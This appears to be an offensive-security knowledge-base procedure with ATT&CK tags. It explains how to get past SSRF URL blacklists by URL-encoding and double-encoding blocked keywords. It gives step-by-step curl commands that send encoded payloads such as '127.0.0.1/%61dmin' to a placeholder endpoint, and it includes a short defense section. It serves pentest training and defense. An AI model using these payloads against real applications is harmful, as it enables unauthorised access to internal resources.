---
type: procedure
description: >-
  Bypass URL blacklists in web applications to enable Server-Side Request
  Forgery (SSRF) attacks by encoding blocked URLs.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
sub_techniques: []
tags:
  - '[[tags/Bypassing filters]]'
  - '[[tags/Bypass using URL encoding]]'
  - '[[tags/Server-Side Request Forgery]]'
  - ssrf
  - url-encoding
  - web-bypass
commands:
  - '[[commands/curl-send-url-encoded-request]]'
  - '[[commands/curl-send-double-url-encoded-request]]'
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/cURL]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Bypass-URL-Blacklist-with-URL-Encoding

## Summary

This procedure demonstrates how to bypass URL blacklists designed to prevent Server-Side Request Forgery (SSRF) attacks by using URL encoding (single or double) on blocked keywords within the target URL. It allows attackers to access internal or restricted resources that the server would otherwise block, enabling further exploitation such as data exfiltration or lateral movement.

## Description

URL blacklists are commonly implemented in web applications to filter out requests to sensitive internal resources, such as localhost (127.0.0.1) or administrative endpoints, to mitigate SSRF vulnerabilities. However, many implementations fail to decode URLs before checking against the blacklist, allowing attackers to encode prohibited strings (e.g., 'admin' as '%61dmin') and bypass the filter. Once bypassed, the server decodes the URL and makes the request on behalf of the attacker.

This technique is effective against applications using simple string matching for blacklists. It requires identifying the SSRF endpoint (e.g., an image fetcher or webhook) and crafting encoded payloads. The target environment is typically a web application with an SSRF vulnerability, such as those using user-supplied URLs in backend requests. Expected outcomes include successful access to blocked resources, potentially leading to metadata retrieval or service compromise.

## Requirements

1. Access to a vulnerable web application with an SSRF endpoint that accepts user-controlled URLs.
2. Knowledge of URL encoding (e.g., converting characters to %XX hexadecimal format).
3. Ability to send custom HTTP requests (e.g., via curl or a proxy like Burp Suite).
4. Identification of blocked keywords (e.g., 'admin', 'localhost') through prior testing.

## Defense

Defensive measures and detection strategies:

- Implement whitelist-based URL validation instead of blacklists, restricting requests to approved domains.
- Decode and normalize URLs (including double encoding) before applying any filters.
- Regularly update and patch web applications to address known SSRF vulnerabilities (e.g., via OWASP guidelines).
- Monitor application logs and network traffic for anomalous internal requests, such as repeated localhost probes or encoded payloads.
- Use Web Application Firewalls (WAFs) with decoding capabilities to inspect requests.

## Objectives

1. Bypass the URL blacklist to reach internal or restricted resources via SSRF.
2. Access sensitive data or services (e.g., admin panels, metadata endpoints) that are normally blocked.
3. Validate the bypass and extract information for further exploitation.

## Instructions

### Step 1: Identify the Blocked URL and Keywords

**Context**: Determine the target resource (e.g., http://127.0.0.1/admin) and the keywords blocked by the blacklist (e.g., 'admin' or '127.0.0.1'). Test direct access first to confirm blocking.

Use [[commands/curl-send-url-encoded-request]] to attempt a direct request:

```bash
curl -X POST -d "url=http://127.0.0.1/admin" http://target.com/ssrf-endpoint
```

> This step confirms the block (e.g., 403 Forbidden or error message). Expected output: Rejection indicating blacklist trigger.

### Step 2: Encode the Blocked Keywords

**Context**: Convert blocked strings to URL-encoded format. For example, 'a' becomes '%61', so 'admin' becomes '%61dmin'. For stricter filters, use double encoding (e.g., '%61' becomes '%2561'). This evades blacklists that do not decode payloads.

Manually craft the encoded URL or use a tool like Burp Suite's decoder. Example encoded payloads:

http://127.0.0.1/%61dmin

http://127.0.0.1/%2561dmin

> Explain why: Encoding hides the keyword from raw string checks, but the server decodes it for the actual request.

### Step 3: Send the Single-Encoded Request

**Context**: Submit the encoded URL to the SSRF endpoint to test bypass.

Execute [[commands/curl-send-url-encoded-request]] with the encoded payload:

```bash
curl -X POST -d "url=http://127.0.0.1/%61dmin" http://target.com/ssrf-endpoint -v
```

> The -v flag provides verbose output for debugging. Expected output: Successful response from the internal resource (e.g., admin page HTML or data).

### Step 4: Test Double Encoding if Needed

**Context**: If single encoding fails (e.g., due to partial decoding), apply double encoding to further obfuscate.

Use [[commands/curl-send-double-url-encoded-request]]:

```bash
curl -X POST -d "url=http://127.0.0.1/%2561dmin" http://target.com/ssrf-endpoint -v
```

> This handles cases where the blacklist decodes once but the server decodes twice. Expected output: Access to the resource if the bypass succeeds.

### Step 5: Verify and Extract Data

**Context**: Confirm access and retrieve any sensitive information from the response.

Inspect the response for success indicators, such as internal page content. If interactive, chain with further SSRF payloads.

> Decision point: If blocked, try alternative encodings (e.g., %u0061 for Unicode) or paths. Otherwise, proceed to exfiltration.
